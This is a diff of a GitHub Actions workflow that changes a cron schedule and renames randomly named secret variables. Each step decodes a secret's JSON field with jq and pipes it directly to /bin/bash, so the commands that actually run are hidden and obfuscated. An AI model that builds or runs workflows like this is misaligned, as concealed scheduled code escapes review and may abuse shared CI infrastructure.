@@ -1,27 +1,25 @@
 name: fangziwenni
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '51 3/6 * * *'
+    - cron: '31 0/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: fangziwenni
         env:
-          fri431: ${{ secrets.fri431 }}
+          yf42791: ${{ secrets.yf42791 }}
         run: |
-          echo $fri431 | jq -r .imtuq6 | /bin/bash
-          echo $iyjgm1294 | jq -r .aga4 | /bin/bash
-          echo $gi0530 | jq -r .qigux5897 | /bin/bash
-          echo $v175 | jq -r .er8 | /bin/bash
-          echo $rhuva4 | jq -r .cmt31 | /bin/bash
-          echo $jxi9629 | jq -r .md13 | /bin/bash
-          echo $mcx1 | jq -r .nbdff89 | /bin/bash
-          echo $bulye91403 | jq -r .n4 | /bin/bash
-          echo $kjmj0 | jq -r .x63519 | /bin/bash
-          echo $xll253 | jq -r .hd5 | /bin/bash
+          echo $yf42791 | jq -r .x090 | /bin/bash
+          echo $vvm6926 | jq -r .l287 | /bin/bash
+          echo $e25201 | jq -r .j7 | /bin/bash
+          echo $s5079 | jq -r .i88101 | /bin/bash
+          echo $hrqts13952 | jq -r .ipofh077 | /bin/bash
+          echo $z1594 | jq -r .k46 | /bin/bash
+          echo $tan63 | jq -r .c72 | /bin/bash
+          echo $bsit3 | jq -r .f62 | /bin/bash
+          echo $za3 | jq -r .ej99 | /bin/bash
 
